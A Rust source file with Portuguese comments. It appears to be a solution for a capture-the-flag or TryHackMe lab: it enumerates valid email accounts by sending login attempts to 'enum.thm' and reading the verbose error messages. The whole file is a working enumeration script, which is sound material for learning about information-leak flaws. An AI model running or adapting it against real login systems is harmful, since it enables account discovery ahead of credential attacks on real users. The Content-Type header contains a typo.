use reqwest::{
    Client,
    header::{HeaderMap, HeaderName, HeaderValue},
}; //Para fazer requisições HTTP
use serde_json::Value; //Para lidar com respostas JSON
use std::env; //Para acessar argumentos da linha de comando
use std::fs::File; // Para ler o arquivo com e-mails
use std::io::{self, BufRead}; // Para ler o arquivo com e-mails

// Função assíncrona para verificar se o amail é valido
async fn check_email(client: &Client, email: &str) -> Result<Value, reqwest::Error> {
    let url = "http://enum.thm/labs/verbose_login/functions.php";

    // Criando um HeaderMap para armazenar os headers
    let mut headers = HeaderMap::new();
    let headers_values = [
        ("Host", "enum.thm"),
        (
            "User-Agent",
            "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0",
        ),
        ("Accept", "application/json, text/javascript, */*; q=0.01"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Accept-Encoding", "gzip, deflate"),
        (
            "Content-Type",
            "application/x-ww-form-urlencoded; charset=UTF-8",
        ),
        ("X-Requested-With", "XMLHttpRequest"),
        ("Origin", "http://enum.thm"),
        ("Connection", "close"),
        ("Referer", "http://enum.thm/labs/verbose_login/"),
    ];

    // Inserindo os headers no HeaderMap
    for (key, value) in &headers_values {
        headers.insert(
            key.parse::<HeaderName>().unwrap(),
            HeaderValue::from_str(value).unwrap(),
        );
    }

    // Criando o corpo da requisição
    let params = [
        ("username", email),
        ("password", "password"),
        ("function", "login"),
    ];

    // Enviando a requisição HTTP com os headers e o corpo
    let response = client
        .post(url)
        .headers(headers)
        .form(&params)
        .send()
        .await?;

    // Convertendo a reposta para JSON
    let json: Value = response.json().await?;
    Ok(json)
}

// Função para ler emails de um arquivo e verificar sua validade
async fn enumerate_emails(filename: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut valid_emails = Vec::new();
    let invalid_error = "Email does not exist";
    let client = Client::new();

    if let Ok(file) = File::open(filename) {
        let reader = io::BufReader::new(file);
        for line in reader.lines() {
            if let Ok(email) = line {
                let email = email.trim();
                if !email.is_empty() {
                    match check_email(&client, email).await {
                        Ok(response_json) => {
                            if response_json["status"] == "error"
                                && response_json["message"]
                                    .as_str()
                                    .map_or(false, |msg| msg.contains(invalid_error))
                            {
                                println!("[INVALID] {}", email);
                            } else {
                                println!("[VALID] {}", email);
                                valid_emails.push(email.to_string());
                            }
                        }
                        Err(e) => eprintln!("Erro ao verificar email {}: {}", email, e),
                    }
                }
            }
        }
    }
    Ok(valid_emails)
}

// Função principal assíncrona que inicia o programa
#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprintln!("Uso: cargo run <email_list_file>");
        std::process::exit(1);
    }

    let email_file = &args[1];
    match enumerate_emails(email_file).await {
        Ok(valid_emails) => {
            println!("\nEmails válidos encontrados:");
            for email in valid_emails {
                println!("{}", email);
            }
        }
        Err(e) => eprintln!("Erro: {}", e),
    }
}
